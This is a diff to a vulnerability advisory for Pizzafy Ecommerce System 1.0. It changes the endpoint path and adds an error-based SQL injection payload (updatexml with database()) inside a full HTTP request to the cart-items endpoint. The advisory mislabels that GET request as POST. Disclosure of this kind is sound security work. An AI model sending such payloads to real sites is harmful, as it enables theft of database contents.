@@ -8,7 +8,7 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `/pizza/admin/ajax.php?action=get_cart_items&id=1`
+- `/pizzafy/admin/ajax.php?action=get_cart_items&id=1`
 
 ## **Overview**
 The Pizzafy Ecommerce System 1.0 contains multiple critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
@@ -90,7 +90,7 @@ public function get_cart_items() {
 Below is a **POST** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  
 
 ```
-GET /pizza/admin/ajax.php?action=get_cart_items&id=1' HTTP/1.1
+GET /pizzafy/admin/ajax.php?action=get_cart_items&id=6%20AND%20updatexml(1,concat(0x7e,database()),1)%23 HTTP/1.1
 Host: localhost
 sec-ch-ua: 
 Accept: application/json, text/javascript, */*; q=0.01
@@ -101,7 +101,7 @@ sec-ch-ua-platform: ""
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/index.php?page=home
+Referer: http://localhost/pizzafy/index.php?page=home
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=jeku15623h3gva8eql2jpr5g4i
@@ -112,7 +112,7 @@ Connection: close
 This payload injects the SQL command:  
 
 ```sql
-id=1'
+id=6%20AND%20updatexml(1,concat(0x7e,database()),1)%23 HTTP/1.1
 ```
 This makes it possible to get data from the database.
 
@@ -120,7 +120,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/lsBfj1i.png)
+- ![](https://i.imgur.com/msngkG7.png)
 ---
 
 ## Remediation
